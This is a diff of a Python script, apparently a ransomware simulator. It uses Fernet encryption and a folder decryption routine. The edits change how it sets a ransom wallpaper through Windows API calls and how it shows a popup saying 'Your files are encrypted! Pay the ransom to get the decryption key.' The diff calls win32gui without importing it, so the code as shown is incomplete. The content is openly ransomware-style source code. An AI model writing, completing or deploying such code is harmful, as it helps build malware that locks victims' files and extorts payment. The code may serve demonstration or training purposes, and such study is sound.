@@ -8,7 +8,7 @@
 # Import Libraries
 from cryptography.fernet import Fernet
 import os
-from tkinter import Tk, messagebox
+import subprocess
 import ctypes
 
 # Define Variables
@@ -115,14 +115,13 @@ def recursively_decrypt_folder(folder_path):
 def simulate_ransomware():
     # Change desktop wallpaper
     SPI_SETDESKWALLPAPER = 20
-    wallpaper_path = "https://www.logicmanager.com/wp-content/uploads/2021/10/BlogLP-BEWARE-Ransomware-eBook-800x382.png"
+    wallpaper_path = "path/to/ransomware_wallpaper.png"  # Replace with the path to your ransomware wallpaper image
     ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, wallpaper_path, 3)
 
     # Create a popup window with ransomware message
-    root = Tk()
-    root.withdraw()
-    messagebox.showerror("Ransomware Attack", "Your files are encrypted!\nPay the ransom to get the decryption key.")
-    root.destroy()
+    message = "Your files are encrypted!\nPay the ransom to get the decryption key."
+    title = "Ransomware Attack"
+    win32gui.MessageBox(0, message, title, 0x40 | 0x1)
 
 # Main 
 
